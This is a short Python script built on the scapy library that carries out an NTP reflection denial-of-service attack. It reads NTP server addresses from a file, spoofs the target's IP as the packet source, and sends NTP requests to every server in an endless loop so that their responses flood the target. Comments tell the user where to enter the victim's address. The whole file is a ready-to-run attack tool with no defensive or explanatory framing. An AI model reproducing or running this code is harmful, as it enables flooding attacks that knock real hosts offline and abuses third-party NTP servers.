import scapy.all as scapy


#Put the IP address of the target below
targetIP = ""


#Place a list of NTP server IP addresses in a file named NTP.txt in the same directory
file = open("NTP.txt", "r")


##Pre-defined parts of the packet

#Layer 3
version = 4

#Layer 4
destinationPort = 123
UDP_L4 = scapy.UDP(dport = destinationPort)

#NTP
NTP = scapy.NTP()


while True:
    
    for line in file:
        #Layer 3
        destinationIP = repr(line)[1:-1].strip(r"\n")
        print(destinationIP)
        L3 = scapy.IP(version = version, dst = destinationIP, src = targetIP)

        #Packet creation
        packet = L3 / UDP_L4 / NTP
        
        #Sends the packet and does not wait on a response
        scapy.send(packet)
    
    #returns to the top of the NTP.txt file
    file.seek(0)
